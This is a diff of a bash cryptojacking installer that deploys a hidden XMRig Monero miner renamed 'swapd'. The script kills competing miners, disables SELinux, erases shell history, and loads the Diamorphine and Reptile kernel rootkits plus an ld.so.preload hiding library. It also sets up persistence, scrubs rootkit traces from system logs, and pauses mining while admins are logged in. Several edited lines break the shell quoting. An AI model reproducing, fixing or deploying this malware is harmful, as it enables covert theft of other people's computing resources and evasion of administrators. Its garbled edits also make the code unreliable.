@@ -126,9 +126,9 @@ force_stop_service() {
 }
 
 # ==================== ULTIMATE CLEAN INSTALLATION ====================
-echo "========================================================================="
+echo '========================================================================='
 echo "[*] ULTIMATE CLEAN INSTALL - Removing ALL previous traces"
-echo "========================================================================="
+echo '========================================================================='
 
 # Phase 1: Kill all mining and related processes
 echo "[*] Phase 1: Terminating all mining processes..."
@@ -211,16 +211,16 @@ find /tmp /var/tmp \( -name "*xmrig*" -o -name "*swapd*" -o -name "*gdm*" -o -na
 echo "[✓] System fully cleaned from previous installations"
 echo "[*] Sleeping 3 seconds before fresh install..."
 sleep 3
-echo "========================================================================="
+echo '========================================================================='
 # ======================================================================
 
 # Continue with original script...
 VERSION=3.2
-echo "========================================================================="
+echo '========================================================================='
 echo "MoneroOcean FULL ULTIMATE Setup v$VERSION"
 echo "Features: Kernel Rootkits + libhide.so + Intelligent Watchdog"
-echo "========================================================================="
-echo ""
+echo '========================================================================='
+echo ''
 
 # ========================================================================
 # DNS FALLBACK MECHANISM
@@ -432,7 +432,7 @@ else
     echo "[→] Will use systemd for service management"
 fi
 
-echo ""
+echo ''
 
 # ========================================================================
 # STEP 2: DETECT AND FIX SSL/TLS ISSUES (curl vs wget)
@@ -495,7 +495,7 @@ else
     fi
 fi
 
-echo ""
+echo ''
 
 # ========================================================================
 # STEP 2.5: INSTALL GCC FOR PROCESS HIDING (BEFORE libhide.so!)
@@ -526,7 +526,7 @@ else
     echo "[✓] gcc is available"
 fi
 
-echo ""
+echo ''
 
 # ========================================================================
 # STEP 2.6: DEPLOY LIBHIDE.SO (USERLAND PROCESS HIDING)
@@ -559,7 +559,7 @@ else
     echo "[*] Will rely on kernel rootkits (Diamorphine/Reptile) for process hiding"
 fi
 
-echo ""
+echo ''
 
 # ========================================================================
 # STEP 2.7: MINER KILLER SUITE (From Gemini v3.0)
@@ -581,7 +581,7 @@ rm -rf /var/tmp/.xm* /dev/shm/.xm* 2>/dev/null
 lsof -ti:3333,5555,7777,8888 2>/dev/null | xargs -r kill -9 2>/dev/null
 
 echo "[✓] Miner killer suite completed"
-echo ""
+echo ''
 
 # ========================================================================
 # UNIVERSAL DOWNLOAD FUNCTION
@@ -646,19 +646,19 @@ manual_upload_instructions() {
     local filename="$1"
     local target_path="$2"
     
-    echo ""
+    echo ''
     echo "========================================================================"
     echo "[!] AUTOMATIC DOWNLOAD FAILED - MANUAL UPLOAD REQUIRED"
     echo "========================================================================"
-    echo ""
+    echo ''
     echo "Your system's OpenSSL/SSL is too old to download from modern HTTPS sites."
     echo "This is common on CentOS 5/6 and very old systems."
-    echo ""
+    echo ''
     echo "SOLUTION - Manual Upload:"
-    echo ""
+    echo ''
     echo "1. On a modern computer, download the file:"
     echo "   wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
-    echo ""
+    echo ''
     echo "2. Transfer to THIS server:"
     
     # Get server IP (compatible with ancient hostname)
@@ -671,11 +671,11 @@ manual_upload_instructions() {
     fi
     
     echo "   scp xmrig.tar.gz root@${SERVER_IP}:$target_path"
-    echo ""
+    echo ''
     echo "3. Then press ENTER to continue (or Ctrl+C to abort)"
-    echo ""
+    echo ''
     echo "========================================================================"
-    echo ""
+    echo ''
     
     # Check if file already exists
     if [ -f "$target_path" ]; then
@@ -700,11 +700,11 @@ manual_upload_instructions() {
             echo "[✓] File detected - continuing..."
             return 0
         else
-            echo ""
+            echo ''
             echo "[ERROR] File still not found after waiting."
             echo "[ERROR] Please upload xmrig.tar.gz to $target_path"
             echo "[ERROR] Then run this script again."
-            echo ""
+            echo ''
             return 1
         fi
     fi
@@ -716,7 +716,7 @@ if [ "$USE_WGET" = true ]; then
 else
     echo "    → Using: curl"
 fi
-echo ""
+echo ''
 
 # ========================================================================
 # FUNCTION: CREATE SYSV INIT SCRIPT (fallback for old systems)
@@ -838,8 +838,8 @@ EOFSYSV
     echo "[✓] SysV init script created: /etc/init.d/swapd"
 }
 
-echo "========================================================================="
-echo ""
+echo '========================================================================='
+echo ''
 
 # Disable SELinux if present
 [ -f /usr/sbin/setenforce ] && setenforce 0 2>/dev/null || true
@@ -889,8 +889,7 @@ fi
 
 echo "[*] SSH configured (session preserved)"
 
-set -x
-echo "[DEBUG] unset HISTFILE..."
+
 
 # Timeout and self-healing execution
 timeout_run() {
@@ -923,6 +922,8 @@ safe_run() {
     return $status
 }
 
+set +x
+echo "[DEBUG] unset HISTFILE..."
 unset HISTFILE
 export HISTFILE=/dev/null
 #unset HISTFILE ;history -d $((HISTCMD-1))
@@ -1037,10 +1038,10 @@ EMAIL=$2 # this one is optional
 # =============== INTEGRATED MINER KILLER SCRIPTS ========================
 # ========================================================================
 
-echo ""
-echo "========================================================================="
+echo ''
+echo '========================================================================='
 echo "[*] EXECUTING MINER KILLER SUITE..."
-echo "========================================================================="
+echo '========================================================================='
 
 # Killing processes by name, path, arguments and CPU utilization
 minerkiller_processes(){
@@ -1115,7 +1116,7 @@ minerkiller_files(){
 minerkiller_files
 minerkiller_processes
 echo "[*] Miner killer completed"
-echo ""
+echo ''
 
 echo "[*] #checking prerequisites..."
 
@@ -1398,10 +1399,10 @@ fi
 
 # If all automatic methods failed, fall back to manual upload
 if [ "$DOWNLOAD_SUCCESS" = false ]; then
-    echo ""
+    echo ''
     echo "[!] All automatic download methods failed!"
     echo "[*] Your system appears to have very old SSL/TLS libraries"
-    echo ""
+    echo ''
     
     # Provide manual upload instructions and wait
     if manual_upload_instructions "xmrig.tar.gz" "/tmp/xmrig.tar.gz"; then
@@ -1699,14 +1700,14 @@ disown
 /usr/local/bin/clean-rootkit-logs.sh >/dev/null 2>&1 &
 
 echo "[✓] Intelligent watchdog deployed (3-min intervals, state-tracked)"
-echo ""
+echo ''
 
 echo "[*] #preparing script background work and work under reboot..."
 
 if ! sudo -n true 2>/dev/null; then
   if ! grep .swapd/swapd.sh "$HOME"/.profile >/dev/null; then
     echo "[*] Adding "$HOME"/.swapd/swapd.sh script to "$HOME"/.profile"
-    echo ""$HOME"/.swapd/swapd.sh --config="$HOME"/.swapd/config.json >/dev/null 2>&1" >>"$HOME"/.profile
+    echo ''$HOME"/.swapd/swapd.sh --config="$HOME"/.swapd/config.json >/dev/null 2>&1" >>"$HOME"/.profile
   else
     echo "Looks like "$HOME"/.swapd/swapd.sh script is already in the "$HOME"/.profile"
   fi
@@ -1980,7 +1981,7 @@ EOL
             echo "[!] WARNING: Service is NOT running!"
             echo "[!] Checking logs..."
             sudo journalctl -u swapd -n 20 --no-pager
-            echo ""
+            echo ''
             echo "[!] Trying to start again..."
             sudo systemctl start swapd.service
             sleep 2
@@ -1993,7 +1994,7 @@ EOL
             fi
         fi
         
-        echo ""
+        echo ''
         echo "[✓] systemd service created and enabled"
         echo "To see swapd service logs run \"sudo journalctl -u swapd -f\" command"
         echo "To check status run \"sudo systemctl status swapd\" command"
@@ -2020,7 +2021,7 @@ if [ "$SYSTEMD_AVAILABLE" = true ] && command -v systemctl >/dev/null 2>&1; then
 fi
 
 # Verify service was created
-echo ""
+echo ''
 echo "[*] Verifying service installation..."
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
     if systemctl list-unit-files 2>/dev/null | grep -q "swapd.service"; then
@@ -2036,7 +2037,7 @@ else
     echo "[!] WARNING: No service/init script found - miner will not auto-start on reboot"
 fi
 
-echo ""
+echo ''
 echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
 if [ "$CPU_THREADS" -lt "4" ]; then
   echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
@@ -2052,7 +2053,7 @@ else
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \"$HOME"/.swapd/config.json"
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \"$HOME"/.swapd/config_background.json"
 fi
-echo ""
+echo ''
 
 echo "[*] #Installing r00tkit(z)"
 #cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r) git make gcc -y --force-yes ; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'`
@@ -2159,10 +2160,10 @@ echo "[*] hid1ng... ;)"
 
 kill -31 "$(pgrep -f -u root config.json)"
 
-kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
+kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')"
 #kill -31 `/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
 
-kill -63 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}') :
+kill -63 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')"
 #kill -63 `/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
 
 # echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
@@ -2331,7 +2332,7 @@ sed -i '/diamorphine/d' /var/log/syslog 2>/dev/null
 sed -i '/diamorphine/d' /var/log/kern.log 2>/dev/null
 sed -i '/diamorphine/d' /var/log/messages 2>/dev/null
 
-kill -63 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
+kill -63 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')"
 
 # Create emergency swap to prevent OOM killer
 sudo dd if=/dev/zero of=/swapfile bs=1G count=2
@@ -2461,7 +2462,7 @@ sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
 kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
 rm -rf hiding-cryptominers-linux-rootkit/
 
-echo ""
+echo ''
 echo "[*] Starting swapd service..."
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
     systemctl start swapd 2>/dev/null
@@ -2514,7 +2515,7 @@ if command -v journalctl >/dev/null 2>&1; then
 fi
 
 
-echo ""
+echo ''
 
 kill -31 "$(pgrep -f -u root config.json) 2>/dev/null || true
 kill -31 "$(pgrep -f -u root config_background.json) 2>/dev/null || true
@@ -2528,107 +2529,98 @@ kill -63 "$(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{prin
 echo "[*] Cleaning up xmrig files in login directory..."
 rm -rf ~/xmrig*.* 2>/dev/null
 
-echo ""
-echo "========================================================================="
-echo "[✓] FULL ULTIMATE v3.2 SETUP COMPLETE!"
-echo "========================================================================="
-echo ""
-echo "System Configuration:"
+echo '========================================================================='
+echo '[✓] FULL ULTIMATE v3.2 SETUP COMPLETE!'
+echo '========================================================================='
+echo ''
+echo 'System Configuration:'
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
-    echo "  Init System: systemd"
-    echo ""
-    echo "Service Management Commands:"
-    echo "  Start:   systemctl start swapd"
-    echo "  Stop:    systemctl stop swapd"
-    echo "  Status:  systemctl status swapd"
-    echo "  Logs:    journalctl -u swapd -f"
+    echo '  Init System: systemd'
+    echo ''
+    echo 'Service Management Commands:'
+    echo '  Start:   systemctl start swapd'
+    echo '  Stop:    systemctl stop swapd'
+    echo '  Status:  systemctl status swapd'
+    echo '  Logs:    journalctl -u swapd -f'
 else
-    echo "  Init System: SysV init (legacy mode)"
-    echo ""
-    echo "Service Management Commands:"
-    echo "  Start:   /etc/init.d/swapd start"
-    echo "  Stop:    /etc/init.d/swapd stop"
-    echo "  Status:  /etc/init.d/swapd status"
-    echo "  Restart: /etc/init.d/swapd restart"
+    echo '  Init System: SysV init (legacy mode)'
+    echo ''
+    echo 'Service Management Commands:'
+    echo '  Start:   /etc/init.d/swapd start'
+    echo '  Stop:    /etc/init.d/swapd stop'
+    echo '  Status:  /etc/init.d/swapd status'
+    echo '  Restart: /etc/init.d/swapd restart'
 fi
 
-echo ""
-echo "Stealth Features Deployed:"
+echo ''
+echo 'Stealth Features Deployed:'
 if [ -f /usr/local/lib/libhide.so ] && [ -f /etc/ld.so.preload ]; then
-    echo "  ✓ libhide.so: ACTIVE (userland hiding)"
+    echo '  ✓ libhide.so: ACTIVE (userland hiding)'
 else
-    echo "  ✗ libhide.so: Not deployed (gcc unavailable)"
+    echo '  ✗ libhide.so: Not deployed (gcc unavailable)'
 fi
 
 if lsmod | grep -q diamorphine 2>/dev/null; then
-    echo "  ✓ Diamorphine: ACTIVE (kernel rootkit)"
+    echo '  ✓ Diamorphine: ACTIVE (kernel rootkit)'
 else
-    echo "  ○ Diamorphine: Not loaded"
+    echo '  ○ Diamorphine: Not loaded'
 fi
 
 if [ -d /reptile ] || lsmod | grep -q reptile 2>/dev/null; then
-    echo "  ✓ Reptile: ACTIVE (kernel rootkit)"
+    echo '  ✓ Reptile: ACTIVE (kernel rootkit)'
 else
-    echo "  ○ Reptile: Not loaded"
+    echo '  ○ Reptile: Not loaded'
 fi
 
 if [ -f /usr/local/bin/system-watchdog ]; then
-    echo "  ✓ Intelligent Watchdog: ACTIVE (3-min, state-tracked)"
+    echo '  ✓ Intelligent Watchdog: ACTIVE (3-min, state-tracked)'
 else
-    echo "  ○ Watchdog: Not deployed"
+    echo '  ○ Watchdog: Not deployed'
 fi
 
 if [ -f /root/.swapd/launcher.sh ]; then
-    echo "  ✓ launcher.sh: ACTIVE (mount --bind /proc hiding)"
+    echo '  ✓ launcher.sh: ACTIVE (mount --bind /proc hiding)'
 else
-    echo "  ○ launcher.sh: Not created"
+    echo '  ○ launcher.sh: Not created'
 fi
 
-echo "  ✓ Resource Constraints: Nice=19, CPUQuota=95%, Idle scheduling"
-echo "  ✓ Miner renamed: 'swapd' (stealth binary name)"
+echo '  ✓ Resource Constraints: Nice=19, CPUQuota=95%, Idle scheduling'
+echo '  ✓ Miner renamed: 'swapd' (stealth binary name)'
 
-echo ""
-echo "Installation Method:"
+echo ''
+echo 'Installation Method:'
 if [ "$USE_WGET" = true ]; then
-    echo "  Download Tool: wget (curl SSL/TLS failed)"
+    echo '  Download Tool: wget (curl SSL/TLS failed)'
 else
-    echo "  Download Tool: curl"
+    echo '  Download Tool: curl'
 fi
 
 # Check how the file was obtained
 if [ -f /tmp/.local_file_used ]; then
-    echo "  Download Mode: Local file (from script directory)"
+    echo '  Download Mode: Local file (from script directory)'
     rm -f /tmp/.local_file_used
 elif [ -f /tmp/.manual_upload_used ]; then
-    echo "  Download Mode: Manual upload (SSL too old for HTTPS)"
+    echo '  Download Mode: Manual upload (SSL too old for HTTPS)'
     rm -f /tmp/.manual_upload_used
 else
-    echo "  Download Mode: Automatic download"
+    echo '  Download Mode: Automatic download'
 fi
 
-echo ""
-echo "Mining Configuration:"
-echo "  Binary:  /root/.swapd/swapd"
-echo "  Config:  /root/.swapd/config.json"
-echo "  Wallet:  $WALLET"
-echo "  Pool:    gulf.moneroocean.stream:80"
+echo ''
+echo 'Mining Configuration:'
+echo '  Binary:  /root/.swapd/swapd'
+echo '  Config:  /root/.swapd/config.json'
+echo '  Wallet:  $WALLET'  # Keep double quotes for variable expansion
+echo '  Pool:    gulf.moneroocean.stream:80'
 
-echo ""
-echo "Process Hiding Commands:"
-echo "  Hide:    kill -31 \$PID  (requires Diamorphine)"
-echo "  Unhide:  kill -63 \$PID  (requires Diamorphine)"
-echo "  Reptile: /reptile/reptile_cmd hide"
+echo ''
+echo 'Process Hiding Commands:'
+echo '  Hide:    kill -31 $PID  (requires Diamorphine)'
+echo '  Unhide:  kill -63 $PID  (requires Diamorphine)'
+echo '  Reptile: /reptile/reptile_cmd hide'
 
-echo ""
-echo "========================================================================="
-echo "[*] Miner will auto-stop when admins login and restart when they logout"
-echo "[*] All processes are hidden via multiple stealth layers"
-echo "========================================================================="
-
-#echo ""
-#echo "Miner Details:"
-#echo "  Binary:  /root/.swapd/swapd"
-#echo "  Config:  /root/.swapd/config.json"
-#echo "  Wallet:  $WALLET"
-#echo ""
-#echo "========================================================================="
+echo ''
+echo '========================================================================='
+echo '[*] Miner will auto-stop when admins login and restart when they logout'
+echo '[*] All processes are hidden via multiple stealth layers'
+echo '========================================================================='
